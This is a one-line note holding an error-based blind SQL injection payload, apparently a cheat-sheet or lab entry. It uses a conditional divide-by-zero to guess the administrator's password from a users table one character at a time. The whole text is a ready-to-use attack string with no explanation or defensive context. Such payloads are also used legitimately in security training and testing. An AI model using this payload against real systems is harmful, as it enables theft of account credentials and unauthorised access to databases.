' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM users)='a error based
